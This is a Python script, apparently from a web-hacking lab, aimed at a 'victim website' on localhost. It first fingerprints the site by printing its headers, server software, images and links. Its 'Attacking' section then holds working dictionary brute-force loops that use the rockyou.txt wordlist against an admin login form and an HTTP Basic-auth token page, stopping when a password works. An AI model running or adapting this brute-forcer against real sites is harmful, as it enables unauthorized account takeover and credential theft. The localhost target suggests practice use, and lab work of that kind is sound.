import requests
from bs4 import BeautifulSoup

# The Victim Website URL
resp = requests.get('http://localhost')
soup = BeautifulSoup(resp.text, 'html.parser')

# Check if web protal is up using GET Request
print(resp)
# Request status code
# print(resp.status) // comment for safety
# GET Response headers
print(resp.headers)
# Server software
print(resp.headers.get('server'))
# Response Text content (HTML)
print(resp.text)
# Response Text content in a pretty form (HTML)
print(soup.prettify())
# Web Portal Title
print(soup.title.string)

# Print images URLs
img_tags = soup.find_all('img')
urls = [img['src'] for img in img_tags]
print(urls)

# Scrapping all URLs from the website page
anchor_list = [a['href'] for a in soup.find_all('a', href=True) if a.text.strip()]
anchor_set = set(anchor_list)
for link in anchor_set:
    print(link)

#---------------------------------------------------------------
# --------------------------- Attacking ------------------------
#---------------------------------------------------------------

# Bruteforce  login for user "admin"
# -----------------------------------
# Used Dictionary for brute forcing 
password_dict = "rockyou.txt"
lines = [line.rstrip('\n') for line in open(password_dict)]
for password in lines:
    print("Trying with password: ", password)
    # URL for the victim login page (Username is 'admin')
    resp = requests.post('http://localhost/login.php',
                         data={'log': 'admin', 'pwd': password})
    if "ERROR" not in resp.text:
        print("Login successful with password: ", password)
        break
print(resp.text)


# Breaking the Authentication and getting the token
# --------------------------------------------------
# Information of the Token to be stolen
url = 'http://localhost/token/index.html'
username = 'anon'
password_dict = "rockyou.txt"
timeout = 5

# Loading the password dictionary and Striping \n
lines = [line.rstrip('\n') for line in open(password_dict)]

# Processing all the passwords until a successful login is received
for password in lines:
    print("Trying with password: ", password)
    auth = requests.auth.HTTPBasicAuth(username, password)
    resp = requests.get(url=url, auth=auth, verify=False, timeout=timeout)
    if "Authorization Required" not in str(resp.text):
        print("Login successful with password: ", password)
        soup = BeautifulSoup(resp.text, 'html.parser')
        break

print(soup.prettify())
